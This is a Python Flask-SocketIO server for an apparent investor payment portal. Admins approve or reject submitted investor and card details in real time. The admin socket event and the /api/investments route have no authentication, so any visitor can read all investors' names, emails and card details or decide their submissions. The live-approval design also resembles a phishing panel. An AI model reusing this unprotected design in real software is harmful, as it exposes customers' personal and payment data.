import uuid, time, os
from flask import Flask, send_from_directory, jsonify
from flask_socketio import SocketIO, emit, join_room

app = Flask(__name__, static_folder='public')
socketio = SocketIO(app, cors_allowed_origins=[
    'https://investor-portal-production.up.railway.app',
    'https://xddobsobd.netlify.app',
    'http://localhost:3000'
], async_mode='eventlet',
                    ping_timeout=60, ping_interval=25)

# id → dict
investments = {}
# set of admin session IDs
admin_sids = set()


# ── Static pages ──────────────────────────────────────────────────
@app.route('/')
def payment():
    return send_from_directory('public', 'payment.html')

@app.route('/admin')
def admin():
    return send_from_directory('public', 'admin.html')

@app.route('/api/investments')
def api_investments():
    lst = sorted(investments.values(), key=lambda r: r['timestamp'], reverse=True)
    return jsonify(lst)


# ── Socket events ─────────────────────────────────────────────────
@socketio.on('connect')
def on_connect():
    pass  # connection accepted

@socketio.on('disconnect')
def on_disconnect():
    from flask import request
    sid = request.sid
    admin_sids.discard(sid)
    for inv in investments.values():
        if inv['clientSocketId'] == sid and inv['status'] == 'pending':
            inv['status'] = 'disconnected'
            for asid in admin_sids:
                socketio.emit('admin:update', {'id': inv['id'], 'status': 'disconnected'}, to=asid)

@socketio.on('admin:join')
def on_admin_join():
    from flask import request
    admin_sids.add(request.sid)
    lst = sorted(investments.values(), key=lambda r: r['timestamp'], reverse=True)
    emit('admin:init', lst)

@socketio.on('investor:submit')
def on_investor_submit(data):
    from flask import request
    inv_id = str(uuid.uuid4())
    record = {
        'id': inv_id,
        'clientSocketId': request.sid,
        'status': 'pending',
        'timestamp': int(time.time() * 1000),
        'amount': data.get('amount', 0),
        'fname': data.get('fname', ''),
        'lname': data.get('lname', ''),
        'email': data.get('email', ''),
        'investorType': data.get('investorType', ''),
        'cardLast4': data.get('cardLast4', ''),
        'cardName': data.get('cardName', ''),
    }
    investments[inv_id] = record
    for asid in admin_sids:
        socketio.emit('admin:new_investment', record, to=asid)
    emit('investor:pending', {'id': inv_id})

@socketio.on('admin:approve')
def on_approve(data):
    inv_id = data.get('id')
    record = investments.get(inv_id)
    if not record or record['status'] != 'pending':
        return
    record['status'] = 'approved'
    socketio.emit('investor:approved', {'id': inv_id}, to=record['clientSocketId'])
    for asid in admin_sids:
        socketio.emit('admin:update', {'id': inv_id, 'status': 'approved'}, to=asid)

@socketio.on('admin:reject')
def on_reject(data):
    inv_id = data.get('id')
    reason = data.get('reason', '')
    record = investments.get(inv_id)
    if not record or record['status'] != 'pending':
        return
    record['status'] = 'rejected'
    record['rejectReason'] = reason
    socketio.emit('investor:rejected', {'id': inv_id, 'reason': reason}, to=record['clientSocketId'])
    for asid in admin_sids:
        socketio.emit('admin:update', {'id': inv_id, 'status': 'rejected', 'reason': reason}, to=asid)


if __name__ == '__main__':
    port = int(os.environ.get('PORT', 3000))
    print(f'\n  Investor Portal running\n')
    print(f'  Payment page : http://localhost:{port}/')
    print(f'  Admin page   : http://localhost:{port}/admin\n')
    socketio.run(app, host='0.0.0.0', port=port, debug=False)
